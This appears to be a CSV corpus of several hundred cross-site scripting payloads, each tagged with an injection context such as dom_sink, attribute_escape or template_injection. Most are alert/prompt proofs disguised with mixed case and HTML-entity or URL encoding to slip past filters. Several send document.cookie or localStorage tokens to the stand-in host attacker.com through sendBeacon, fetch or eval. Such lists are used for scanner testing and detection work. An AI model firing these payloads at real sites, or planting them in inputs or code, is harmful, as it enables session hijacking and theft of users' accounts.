payload,context
"element.insertAdjacentHTML(%22beforeend%22,%22<img src=x onerror=prompt(localStorage.getItem(%27token%27))>%22)",dom_sink
"element.insertAdjacentHTML(""beforeend"",""<img src=x onerror=alert(navigator.sendBeacon('//attacker.com',document.cookie))>"")",dom_sink
ontransitionrun=alert&#40;1&#41;,event_handler
`><Img srC=x onPlaYinG=aLerT(lOcaTioN.hAsh)>,attribute_escape
<t&#97;bl&#101; onmozfullscr&#101;&#101;nch&#97;ng&#101;=confirm(1) onmozfullscr&#101;&#101;nch&#97;ng&#101;=confirm(1)>,tag_injection
	ontransitionstart=prompt(location.hash),event_handler
`><img src=x onpopst&#97;t&#101;=&#97;l&#101;rt('XSS')>,attribute_escape
onkeydown=console.log/***/(document.domain),event_handler
${{confirm(docum&#101;nt.dom&#97;in)}},template_injection
""" ><svg onpl&#97;y=confirm(docum&#101;nt.dom&#97;in)>",attribute_escape
<taBle onSeaRch=prOmpT(1) oNseArcH=pRomPt(1)>,tag_injection
"""%3E%3Cimg src=x oncontextmenu=alert(1)%3E",attribute_escape
&quot; ongotpointercapture=console.log(%27XSS%27) x=&quot;,attribute_escape
'%3E%3Cimg src=x onpagereveal=alert(location.hash)%3E,attribute_escape
\' OnaUxcLicK=cOnsOle.loG(1)//,attribute_escape
&quot; onended=prompt(%27XSS%27) x=&quot;,attribute_escape
"__pRotO__[""oNpoIntErmOve""]=FetCh(DocUmeNt.CooKie)",dom_sink
'><Img srC=x onBefOreInpUt=ConSolE.lOg(DocUmeNt.DomAin)>,attribute_escape
 onFocUsiN=cOnfIrm(doCumEnt.doMaiN),event_handler
\' onclos&#101;=consol&#101;.log(loc&#97;tion.h&#97;sh)//,attribute_escape
"__proto__[""onscroll&#101;nd""]=XMLHttpR&#101;qu&#101;st(docum&#101;nt.cooki&#101;)",dom_sink
"onclose=\u0061lert/***/(String.fromCharCode(88,83,83))",event_handler
"""><Img srC=x onAniMatIonEnd=coNsoLe.Log('XSS')>",attribute_escape
OndRagOveR=pRomPt&#40;doCumEnt.doMaiN&#41;,event_handler
eval(%22alert(document.domain)%22),dom_sink
&quot; onscrollsn&#97;pch&#97;ng&#101;=consol&#101;.log(loc&#97;tion.h&#97;sh) x=&quot;,attribute_escape
onkeypress=prompt/***/(1),event_handler
`><Img srC=x onCopY=pRomPt(DocUmeNt.DomAin)>,attribute_escape
"%3Cset
onclose=confirm(document.domain)%3E",tag_injection
"DocUmeNt.WriTe(""<iMg Src=x OneRroR=eVal(1)>"")",dom_sink
""" oNprOmpTdiSmiSs=ProMpt(doCumEnt.doMaiN) """,attribute_escape
<dialog/onpagehide=console.log(1)>,tag_injection
<link oninput=\u0061lert(document.domain) oninput=\u0061lert(document.domain)>,tag_injection
"\"" onfocus=prompt(location.hash)//",attribute_escape
"ObjEct.asSigN(wIndOw,{""oNdrAgoVer"":fEtcH})",dom_sink
""" onw&#97;iting=prompt(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape
%3Cscript%3E/*/confirm(document.domain)%3C/script%3E,script_injection
	onp&#97;g&#101;r&#101;v&#101;&#97;l=confirm(docum&#101;nt.dom&#97;in),event_handler
' onkeydown=alert('XSS') ',attribute_escape
"element.setAttribute(%22onclick%22,%22XMLHttpRequest(%27XSS%27)%22)",dom_sink
' oNmoUseWheEl=ConSolE.lOg(1) ',attribute_escape
"s&#101;tTim&#101;out(""consol&#101;.log(bto&#97;(docum&#101;nt.cooki&#101;))"",0)",dom_sink
"ObjEct.asSigN(wIndOw,{""oNenD"":AleRt})",dom_sink
"ObjEct.asSigN(wIndOw,{""oNdrAgeNteR"":ProMpt})",dom_sink
""" onchange=confirm(String.fromCharCode(88,83,83)) """,attribute_escape
"(n&#101;w Function(""prompt(docum&#101;nt.cooki&#101;+'&loc='+loc&#97;tion.hr&#101;f)""))();",dom_sink
"Obj&#101;ct.&#97;ssign(window,{""onp&#97;us&#101;"":confirm})",dom_sink
"${{'&#97;l&#101;rt(docum&#101;nt.dom&#97;in)'.r&#101;pl&#97;c&#101;('&#97;l&#101;rt(docum&#101;nt.dom&#97;in)','')}}",template_injection
<animatemotion onanimationiteration=console.log(%27XSS%27) onanimationiteration=console.log(%27XSS%27)>,tag_injection
"ObjEct.asSigN(wIndOw,{""oNbeForEcuT"":ConFirM})",dom_sink
<xsS oNtoGglE=cOnsOle.loG('XSS') OntOggLe=ConSolE.lOg('XSS')>,tag_injection
"onk&#101;ydown=&#97;l&#101;rt/**/(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler
<script onpointerrawupdate=console.log(document.domain) onpointerrawupdate=console.log(document.domain)>,tag_injection
 onend=prompt(1),event_handler
"'><scr	ipt>alert(String.fromCharCode(88,83,83))</scr	ipt>",script_injection
"Obj&#101;ct.&#97;ssign(window,{""ontouchmov&#101;"":XMLHttpR&#101;qu&#101;st})",dom_sink
"__proto__[""onauxclick""]=eval('//attacker.com/?c='+document.cookie)",dom_sink
""" ondr&#97;gov&#101;r=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape
"__proto__[""ondrop""]=console.log(navigator.sendBeacon('//attacker.com',document.cookie))",dom_sink
OnpOinTerOveR=pRomPt/**/(doCumEnt.doMaiN),event_handler
javascript:%0aconsole.log(%27XSS%27),js_uri
<a onmozfullscreenchange=\u0061lert(location.hash) onmozfullscreenchange=\u0061lert(location.hash)>,tag_injection
onend=alert&#40;1&#41;,event_handler
"__pRotO__[""oNwhEel""]=FetCh('XSS')",dom_sink
`><Img srC=x onFocUs=AleRt(1)>,attribute_escape
"ObjEct.asSigN(wIndOw,{""oNbeGin"":XMLHTtpReqUesT})",dom_sink
""" ><svg onpromptdismiss=prompt(docum&#101;nt.dom&#97;in)>",attribute_escape
 onBefOreTogGle=alErt(loCatIon.haSh),event_handler
%3Ctr onanimationend=prompt('XSS')%3E,tag_injection
""" ><svg onmouseover=console.log('XSS')>",attribute_escape
%22 ><svg ontouchmove=alert(location.hash)>,attribute_escape
`><img src=x onc&#97;npl&#97;y=consol&#101;.log(loc&#97;tion.h&#97;sh)>,attribute_escape
`%3E%3Cimg src=x onanimationcancel=prompt(location.hash)%3E,attribute_escape
"%27 ondblclick=console.log(String.fromCharCode(88,83,83)) %27",attribute_escape
'><img src=x oninput=alert(1)>,attribute_escape
' ><svg ongotpoint&#101;rc&#97;ptur&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in)>,attribute_escape
<template src=x ondragenter=alert('XSS')>,tag_injection
%27><img src=x onbegin=confirm(1)>,attribute_escape
<b&#97;s&#101; ontr&#97;nsitionst&#97;rt=prompt(loc&#97;tion.h&#97;sh) ontr&#97;nsitionst&#97;rt=prompt(loc&#97;tion.h&#97;sh)>,tag_injection
[#&#97;l&#101;rt 1 /],template_injection
"window[""confirm""]('//&#97;tt&#97;ck&#101;r.com/?c='+docum&#101;nt.cooki&#101;)",dom_sink
{{ prompt(docum&#101;nt.cooki&#101;) }},template_injection
"\"" onpointermove=\u0061lert(String.fromCharCode(88,83,83))//",attribute_escape
"<titl&#101;
onst&#97;ll&#101;d=&#97;l&#101;rt('XSS')>",tag_injection
"""><Img srC=x onBefOrePasTe=ConFirM(dOcuMenT.dOmaIn)>",attribute_escape
\' onpointerrawupdate=alert(location.hash)//,attribute_escape
' oncont&#101;xtm&#101;nu=&#97;l&#101;rt(1) ',attribute_escape
"eval(""alert(btoa(document.cookie))"")",dom_sink
<base x=y oninvalid=confirm(location.hash)>,tag_injection
%22 ><svg ondblclick=console.log(%27XSS%27)>,attribute_escape
' %3E%3Csvg ontouchend=confirm('XSS')%3E,attribute_escape
oncut=\u0061lert(document.domain),event_handler
"ObjEct.asSigN(wIndOw,{""oNmoUseDowN"":XMLHttPReQueSt})",dom_sink
' oninput=consol&#101;.log(docum&#101;nt.dom&#97;in) ',attribute_escape
\' onblur=prompt('XSS')//,attribute_escape
<!--><tr onfocus=confirm('XSS')>,tag_injection
<math x=y oninvalid=confirm(%27XSS%27)>,tag_injection
%27 ><svg onpaste=confirm(%27XSS%27)>,attribute_escape
"%22 onmouseover=console.log(String.fromCharCode(88,83,83)) x=%22",attribute_escape
"onpromptdismiss=console.log(String.fromCharCode(88,83,83))",event_handler
"""><Img srC=x onCut=coNfiRm('XSS')>",attribute_escape
%3Cxss onend=prompt('XSS')%3E,tag_injection
"\"" OnaNimAtiOneNd=ConFirM(dOcuMenT.dOmaIn)//",attribute_escape
"""><img src=x on&#101;nd&#101;d=&#97;l&#101;rt('XSS')>",attribute_escape
"\%27 onpopstate=confirm(String.fromCharCode(88,83,83))//",attribute_escape
`><Img srC=x onDroP=cOnfIrm(1)>,attribute_escape
"__pRotO__[""oNclOse""]=ProMpt(doCumEnt.coOkiE)",dom_sink
onerror=console.log(%27XSS%27),event_handler
<!--><img onw&#101;bkitfullscr&#101;&#101;nch&#97;ng&#101;=&#97;l&#101;rt('XSS')>,tag_injection
'%3E%3Cimg src=x ondrop=confirm(document.domain)%3E,attribute_escape
&quOt; onDblCliCk=ConFirM(1) x=&qUot;,attribute_escape
[#cOnfIrm 'XSS' /],template_injection
%3C!--%3E%3Cform onsearch=console.log(1)%3E,tag_injection
"\"" onmouseup=console.log('XSS')//",attribute_escape
j&#97;v&#97;script:%0&#97;&#97;l&#101;rt(1),js_uri
<scRipT>wIndOw['alErt'](LocAtiOn.HasH)</scRipT>,script_injection
ontransitionend=\u0061lert/**/(location.hash),event_handler
"element.insertAdjacentHTML(""beforeend"",""%3Cimg src=x onerror=alert(document.domain)%3E"")",dom_sink
' ><svg onpromptaction=prompt(1)>,attribute_escape
""" ><svG oNgeStuReeNd=AleRt(1)>",attribute_escape
"element.insertAdjacentHTML(""beforeend"",""<img src=x onerror=eval(localStorage.getItem('token'))>"")",dom_sink
"\"" ongotpointercapture=console.log(document.domain)//",attribute_escape
%3C!--%3E%3Cdiv onpause=confirm(location.hash)%3E,tag_injection
\' onmous&#101;down=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)//,attribute_escape
<video/onmozfullscreenchange=prompt('XSS')>,tag_injection
' oNgoTpoIntErcAptUre=coNsoLe.Log('XSS') ',attribute_escape
ondrop=confirm/***/(document.domain),event_handler
JavAscRipT:cOnfIrm(doCumEnt.doMaiN),js_uri
#\u0061lert(document.cookie),template_injection
'><Img srC=x onSeaRch=alErt(1)>,attribute_escape
OnwHeeL=pRomPt(1),event_handler
<teMplAte x=Y oNreSet=alErt(loCatIon.haSh)>,tag_injection
&quOt; onMouSeoVer=coNfiRm('XSS') x=&quOt;,attribute_escape
"' ><svG oNclOse=coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83))>",attribute_escape
%3Cembed onmozfullscreenchange=console.log(document.domain) onmozfullscreenchange=console.log(document.domain)%3E,tag_injection
javascript:/*-/*`/*\`/*%27/*%22/**/(/* */oNcliCk=alert(%27XSS%27) )//%0D%0A%0d%0a,js_uri
<taBle onSelEct=prOmpT(1)>,tag_injection
<mtext x=y onended=confirm(document.domain)>,tag_injection
%27 onbeforetoggle=alert(location.hash) %27,attribute_escape
document.querySelector(%22body%22).innerHTML+=%22confirm(1)%22,dom_sink
"<button
onclick=console.log(1)>",tag_injection
<plaintext onpagereveal=\u0061lert(location.hash)>,tag_injection
'><img src=x onp&#97;g&#101;show=consol&#101;.log(loc&#97;tion.h&#97;sh)>,attribute_escape
<blink x=y onmouseup=\u0061lert(1)>,tag_injection
"&#101;v&#97;l(""prompt('//&#97;tt&#97;ck&#101;r.com/?c='+docum&#101;nt.cooki&#101;)"")",dom_sink
""" oNreSet=prOmpT(lOcaTioN.hAsh) """,attribute_escape
"""><image onchange=alert(1)>",tag_injection
%3Cscript%3E/*/alert('XSS')%3C/script%3E,script_injection
"s&#101;tInt&#101;rv&#97;l(""prompt(docum&#101;nt.cooki&#101;+'&loc='+loc&#97;tion.hr&#101;f)"",100)",dom_sink
%22><img src=x ontouchmove=console.log(%27XSS%27)>,attribute_escape
""" oNmoUseOveR=pRomPt(LocAtiOn.HasH) X=""",attribute_escape
`><img src=x ondblclick=&#97;l&#101;rt(1)>,attribute_escape
<xss src=x ontoggle=console.log(%27XSS%27)>,tag_injection
"""><Img srC=x onAniMatIonCanCel=prOmpT(lOcaTioN.hAsh)>",attribute_escape
#set($x='prompt('XSS')')$x,template_injection
<script>window['prompt'](document.domain)</script>,script_injection
<t&#101;xt&#97;r&#101;&#97; x=y onscroll&#101;nd=&#97;l&#101;rt('XSS')>,tag_injection
<button ondragenter=alert(location.hash)>,tag_injection
"Obj&#101;ct.&#97;ssign(window,{""ondr&#97;gst&#97;rt"":XMLHttpR&#101;qu&#101;st})",dom_sink
<m&#97;th/onscroll&#101;nd=prompt(docum&#101;nt.dom&#97;in)>,tag_injection
<viDeo srC=x onMozFulLscReeNchAngE=pRomPt('XSS')>,tag_injection
OncUt=AleRt(1),event_handler
\' OncLicK=cOnfIrm('XSS')//,attribute_escape
"__proto__[""on&#97;nim&#97;tionit&#101;r&#97;tion""]=&#97;l&#101;rt('XSS')",dom_sink
' ongestureend=confirm('XSS') ',attribute_escape
"&quot; onpl&#97;ying=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83)) x=&quot;",attribute_escape
""" oNseArcH=pRomPt(DocUmeNt.DomAin) """,attribute_escape
<t&#101;mpl&#97;t&#101; onr&#101;s&#101;t=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)/>,tag_injection
"Object.assign(window,{""onvolumechange"":\u0061lert})",dom_sink
""" ><svg onpagehide=console.log(document.domain)>",attribute_escape
"setTimeout(""prompt(localStorage.getItem('token'))"",0)",dom_sink
<!--><A oNkeYprEss=coNfiRm(1)>,tag_injection
""" onfocus=prompt('XSS') &#97;utofocus=""",attribute_escape
<svg x=y onbeforecopy=prompt(document.domain)>,tag_injection
"setInterval(""fetch(btoa(document.cookie))"",100)",dom_sink
<!--><tr onfocus=confirm(%27XSS%27)>,tag_injection
' ><svg ondragover=prompt(1)>,attribute_escape
"<maRquEe OnpRomPtdIsmIss=coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83)) oNprOmpTdiSmiSs=ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83))>",tag_injection
`%3E%3Cimg src=x ongestureend=confirm('XSS')%3E,attribute_escape
<xmp ontransitionend=\u0061lert(location.hash)>,tag_injection
<t&#101;mpl&#97;t&#101; x=y onr&#101;s&#101;t=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,tag_injection
<!--><svg onpromptdismiss=\u0061lert(location.hash)>,tag_injection
	onblur=console.log(1),event_handler
__proto__[%22ongesturestart%22]=eval(document.cookie),dom_sink
%22><meta ontransitionstart=alert(location.hash)>,tag_injection
""" oNfoCus=prOmpT(lOcaTioN.hAsh) aUtoFocUs=""",attribute_escape
javascript:%0aprompt(location.hash),js_uri
"__proto__[""ongestureend""]=prompt('XSS')",dom_sink
&#106;avascript:confirm(1),js_uri
"OnmOusEenTer=jaVasCriPt:AleRt(StrIng.frOmCHarCodE(88,83,83))",event_handler
[#prompt docum&#101;nt.dom&#97;in /],template_injection
"""><img src=x ons&#101;l&#101;ct=confirm(loc&#97;tion.h&#97;sh)>",attribute_escape
"window[%22XMLHttpRequest%22](String.fromCharCode(88,83,83))",dom_sink
<plAinTexT oNtoUchStaRt=AleRt(1)/>,tag_injection
<template src=x onsearch=console.log(document.domain)>,tag_injection
""" %3E%3Csvg onplaying=alert(String.fromCharCode(88,83,83))%3E",attribute_escape
javascr	ipt:prompt/*x*/(document.domain),js_uri
"docum&#101;nt.qu&#101;ryS&#101;l&#101;ctor(""body"").inn&#101;rHTML+=""confirm(loc&#97;lStor&#97;g&#101;.g&#101;tIt&#101;m('tok&#101;n'))""",dom_sink
{{constructor['constructor']('confirm(1)')()}},template_injection
' ontr&#97;nsitionst&#97;rt=confirm(docum&#101;nt.dom&#97;in) ',attribute_escape
%27 onpaste=console.log(document.domain) %27,attribute_escape
"docum&#101;nt.writ&#101;(""<img src=x on&#101;rror=prompt('//&#97;tt&#97;ck&#101;r.com/?c='+docum&#101;nt.cooki&#101;)>"")",dom_sink
<set oncanplay=confirm(1) oncanplay=confirm(1)>,tag_injection
\%27 onpointerup=alert(1)//,attribute_escape
"""><scr	ipt>prompt(String.fromCharCode(88,83,83))</scr	ipt>",script_injection
"Object.assign(window,{%22onfocusout%22:eval})",dom_sink
"eval(""prompt(String.fromCharCode(88,83,83))"")",dom_sink
OnpLayIng=coNsoLe.Log/***/(LocAtiOn.HasH),event_handler
"""%3E%3Cimg src=x ongotpointercapture=confirm(String.fromCharCode(88,83,83))%3E",attribute_escape
"%3Cscript%3EsetTimeout('alert(1)',0)%3C/script%3E",script_injection
<script>Function('&#97;l&#101;rt(1)')();</script>,script_injection
%3Cobject onsubmit=confirm(location.hash)%3E,tag_injection
<auDio onPlaY=cOnsOle.loG(1)/>,tag_injection
"\"" OniNvaLid=prOmpT(1)//",attribute_escape
%3Canimatetransform oncontextmenu=prompt(document.domain) oncontextmenu=prompt(document.domain)%3E,tag_injection
`><img src=x onbeforematch=confirm(1)>,attribute_escape
"location=""javascr	ipt:fetch('//attacker.com/?c='+document.cookie)""",dom_sink
"${{'confirm(document.cookie)'.replace('confirm(document.cookie)','')}}",template_injection
{{[].pop.constructor(%27prompt(document.domain)%27)()}},template_injection
JavAscRipT:%0aaLerT(dOcuMenT.dOmaIn),js_uri
"setTimeout(%22eval(btoa(document.cookie))%22,0)",dom_sink
'><script>prompt(1)</script>,script_injection
' ><svg onfocusout=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,attribute_escape
""" oNerRor=coNfiRm(LocAtiOn.HasH) """,attribute_escape
<link x=y oninput=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)>,tag_injection
""" oNpoIntErmOve=prOmpT('XSS') """,attribute_escape
"`><img src=x ontoggl&#101;=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
'><img src=x onmouseenter=\u0061lert(location.hash)>,attribute_escape
"`%3E%3Cimg src=x ondblclick=console.log(String.fromCharCode(88,83,83))%3E",attribute_escape
"Object.assign(window,{%22onmouseenter%22:alert})",dom_sink
&quot; onkeypress=\u0061lert('XSS') x=&quot;,attribute_escape
<&#97;nim&#97;t&#101; x=y onw&#101;bkitfullscr&#101;&#101;nch&#97;ng&#101;=consol&#101;.log(1)>,tag_injection
J&#97;VasCriPt:ConFirM(1),js_uri
`%3E%3Cimg src=x onclick=prompt('XSS')%3E,attribute_escape
%27 ><svg onpagehide=alert(location.hash)>,attribute_escape
<listing onpopst&#97;t&#101;=prompt(docum&#101;nt.dom&#97;in)>,tag_injection
"' %3E%3Csvg onselect=confirm(String.fromCharCode(88,83,83))%3E",attribute_escape
"Object.assign(window,{""onpopstate"":fetch})",dom_sink
"""><img src=x onk&#101;ypr&#101;ss=&#97;l&#101;rt(1)>",attribute_escape
"\"" onwheel=prompt(location.hash)//",attribute_escape
%3Cscript%3Ewindow['console.log'](location.hash)%3C/script%3E,script_injection
"""><img src=x onwheel=\u0061lert('XSS')>",attribute_escape
%22 ><svg oncut=confirm(%27XSS%27)>,attribute_escape
%22 ><svg onpagehide=alert(location.hash)>,attribute_escape
	onplaying=\u0061lert(1),event_handler
""" onsearch=prompt(location.hash) """,attribute_escape
"__proto__[""onw&#101;bkittr&#97;nsition&#101;nd""]=XMLHttpR&#101;qu&#101;st(String.fromCh&#97;rCod&#101;(88,83,83))",dom_sink
%27><img src=x onwaiting=confirm(document.domain)>,attribute_escape
"""><set onend=\u0061lert(1)>",tag_injection
%3Csvg	onbeforecopy=prompt(document.domain)%3E,tag_injection
%3Cspan x=y oncopy=prompt(location.hash)%3E,tag_injection
"%27 ><svg onpointerdown=console.log(String.fromCharCode(88,83,83))>",attribute_escape
"<!--><xmp onfocusout=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
' %3E%3Csvg ongestureend=confirm('XSS')%3E,attribute_escape
' ><svg on&#97;nim&#97;tionit&#101;r&#97;tion=prompt(1)>,attribute_escape
%27 oncut=alert(%27XSS%27) %27,attribute_escape
__proto__[%22ontouchmove%22]=prompt(document.cookie),dom_sink
"""><link oninput=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)>",tag_injection
"<marquee	onbeforetoggle=alert(String.fromCharCode(88,83,83))>",tag_injection
<audio	onplay=console.log(1)>,tag_injection
%22 ><svg onend=prompt(location.hash)>,attribute_escape
"""><Img srC=x onDblCliCk=ConFirM(1)>",attribute_escape
"%22><img src=x ontouchstart=alert(String.fromCharCode(88,83,83))>",attribute_escape
%22 oninput=alert(1) %22,attribute_escape
`><img src=x onsearch=prompt(document.domain)>,attribute_escape
\' onpause=confirm(document.domain)//,attribute_escape
"""><ForM oNweBkiTanImaTioNenD=pRomPt('XSS')>",tag_injection
\' OndRop=coNfiRm(LocAtiOn.HasH)//,attribute_escape
<td	on&#101;nd=consol&#101;.log(docum&#101;nt.dom&#97;in)>,tag_injection
"${{'\u0061lert(document.domain)'.replace('\u0061lert(document.domain)','')}}",template_injection
<video onclick=console.log(%27XSS%27)>,tag_injection
"%22 ><svg onreset=console.log(String.fromCharCode(88,83,83))>",attribute_escape
location.href=%22javascript:fetch(location.hash)%22,dom_sink
"setInterval(%22alert(%27XSS%27)%22,100)",dom_sink
"<script>Function('console.log(String.fromCharCode(88,83,83))')();</script>",script_injection
 oninput=&#97;l&#101;rt(loc&#97;tion.h&#97;sh),event_handler
%3Ctemplate/ondragenter=alert('XSS')%3E,tag_injection
' ><svg oncut=console.log(1)>,attribute_escape
"onclick=javascr	ipt:confirm(String.fromCharCode(88,83,83))",event_handler
"%27><img src=x onanimationcancel=console.log(String.fromCharCode(88,83,83))>",attribute_escape
&quOt; onDraGenTer=prOmpT(dOcuMenT.dOmaIn) x=&quOt;,attribute_escape
%3Cxmp ontransitionend=alert(location.hash) ontransitionend=alert(location.hash)%3E,tag_injection
"\"" OnmOusEwhEel=alErt(loCatIon.haSh)//",attribute_escape
"""%3E%3Cimg src=x ondragenter=prompt(document.domain)%3E",attribute_escape
	onLoaD=cOnsOle.loG(dOcuMenT.dOmaIn),event_handler
\%22 onauxclick=prompt(location.hash)//,attribute_escape
onw&#101;bkittr&#97;nsition&#101;nd=&#97;l&#101;rt(loc&#97;tion.h&#97;sh),event_handler
#seT($X='ConFirM(dOcuMenT.dOmaIn)')$X,template_injection
"`><Img srC=x onVolUmeChaNge=prOmpT(STriNg.FroMChArCOde(88,83,83))>",attribute_escape
document.write(%22<img src=x onerror=prompt(document.cookie)>%22),dom_sink
"%22><img src=x onpointerrawupdate=confirm(String.fromCharCode(88,83,83))>",attribute_escape
ontransitionrun=\u0061lert(1),event_handler
"window[""consol&#101;.log""](1)",dom_sink
""" ><svg onb&#101;for&#101;p&#97;st&#101;=consol&#101;.log('XSS')>",attribute_escape
`%3E%3Cimg src=x onpointercancel=prompt(1)%3E,attribute_escape
'%3E%3Cimg src=x onpagehide=alert(location.hash)%3E,attribute_escape
<script>window[%27confirm%27](document.domain)</script>,script_injection
%3Cform/onpagehide=confirm(1)%3E,tag_injection
\' OnmOusEdoWn=ConSolE.lOg('XSS')//,attribute_escape
""" ><svg ondrop=prompt('XSS')>",attribute_escape
"Obj&#101;ct.&#97;ssign(window,{""on&#97;uxclick"":XMLHttpR&#101;qu&#101;st})",dom_sink
OnkEyuP=cOnfIrm&#40;lOcaTioN.hAsh&#41;,event_handler
"""%3E%3Cimg src=x ongestureend=confirm(location.hash)%3E",attribute_escape
"' ><svg onw&#97;iting=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
onwebkitfullscreenchange=prompt/***/(document.domain),event_handler
"%22 ><svg onpaste=confirm(String.fromCharCode(88,83,83))>",attribute_escape
""" ><svG oNprOmpTdiSmiSs=ProMpt(loCatIon.haSh)>",attribute_escape
OnlOad=coNfiRm/***/(dOcuMenT.dOmaIn),event_handler
<tr src=x onanimationend=prompt(%27XSS%27)>,tag_injection
<b&#97;s&#101; onk&#101;ydown=&#97;l&#101;rt('XSS') onk&#101;ydown=&#97;l&#101;rt('XSS')>,tag_injection
OnfUllScrEenChaNge=jaVasCriPt:ConSolE.lOg(1),event_handler
<maRquEe OnkEydOwn=coNfiRm(1)/>,tag_injection
"Obj&#101;ct.&#97;ssign(window,{""onvolum&#101;ch&#97;ng&#101;"":&#97;l&#101;rt})",dom_sink
"window[""f&#101;tch""]('//&#97;tt&#97;ck&#101;r.com/?c='+docum&#101;nt.cooki&#101;)",dom_sink
"Object.assign(window,{""onfocusin"":prompt})",dom_sink
"document.body.innerHTML=""<img src=x onerror=console.log(String.fromCharCode(88,83,83))>""",dom_sink
"__pRotO__[""oNanImaTioNcaNceL""]=feTch(naVigAtoR.sEndBeaCon('//atTacKer.coM',DocUmeNt.CooKie))",dom_sink
 onbeforetoggle=prompt(%27XSS%27),event_handler
{alErt 1},template_injection
' %3E%3Csvg onscrollsnapchange=confirm('XSS')%3E,attribute_escape
%3Cspan	oncopy=prompt(location.hash)%3E,tag_injection
onauxclick=javascr	ipt:prompt('XSS'),event_handler
`><img src=x on&#101;nd&#101;d=consol&#101;.log(1)>,attribute_escape
{{[].pop.constructor('prompt('XSS')')()}},template_injection
""" onpromptdismiss=console.log('XSS') """,attribute_escape
"__proto__[%22onpromptdismiss%22]=eval(String.fromCharCode(88,83,83))",dom_sink
"""><Img srC=x onDblCliCk=ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83))>",attribute_escape
""" onscrollsn&#97;pch&#97;ng&#101;=&#97;l&#101;rt(1) """,attribute_escape
<td onsubmit=confirm(docum&#101;nt.dom&#97;in)/>,tag_injection
"%27 ><svg onchange=confirm(String.fromCharCode(88,83,83))>",attribute_escape
"location=""javascr	ipt:fetch(location.hash)""",dom_sink
`><img src=x onended=console.log(document.domain)>,attribute_escape
<obJecT oNsuBmiT=cOnfIrm(loCatIon.haSh)>,tag_injection
OnpRomPtdIsmIss=jaVasCriPt:ProMpt(1),event_handler
""" ><svg onlo&#97;d=consol&#101;.log(1)>",attribute_escape
"Object.assign(window,{""onbeforematch"":fetch})",dom_sink
%3Cimg/onwebkitfullscreenchange=alert('XSS')%3E,tag_injection
%22><img src=x ongotpointercapture=console.log(document.domain)>,attribute_escape
"Obj&#101;ct.&#97;ssign(window,{""onp&#97;us&#101;"":&#101;v&#97;l})",dom_sink
"%3Cxmp x=y onmousewheel=prompt(String.fromCharCode(88,83,83))%3E",tag_injection
'%3E%3Cscript%3Econfirm('XSS')%3C/script%3E,script_injection
"'><img src=x onbegin=\u0061lert(String.fromCharCode(88,83,83))>",attribute_escape
"__pRotO__[""oNanImaTioNcaNceL""]=XMLHtTpREquEst(1)",dom_sink
""" ><svg oncopy=consol&#101;.log('XSS')>",attribute_escape
onkeyup=javascript:confirm(location.hash),event_handler
<&#97;nim&#97;t&#101;motion ondrop=confirm(loc&#97;tion.h&#97;sh) ondrop=confirm(loc&#97;tion.h&#97;sh)>,tag_injection
"location=""javascr	ipt:eval(localStorage.getItem('token'))""",dom_sink
	onMouSedOwn=alErt(1),event_handler
"\"" OneNdeD=aLerT(STriNg.FroMChArCOde(88,83,83))//",attribute_escape
' oNpaUse=coNfiRm('XSS') ',attribute_escape
"""%3E%3Cimg src=x onbeforecopy=prompt(location.hash)%3E",attribute_escape
"""%3E%3Ctitle onstalled=alert('XSS')%3E",tag_injection
"\"" oncanplay=console.log(String.fromCharCode(88,83,83))//",attribute_escape
<imG oNkeYprEss=coNsoLe.Log(1)>,tag_injection
window[%22eval%22](document.cookie),dom_sink
<m&#101;t&#97;	ondrop=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)>,tag_injection
"Obj&#101;ct.&#97;ssign(window,{""onpoint&#101;rup"":consol&#101;.log})",dom_sink
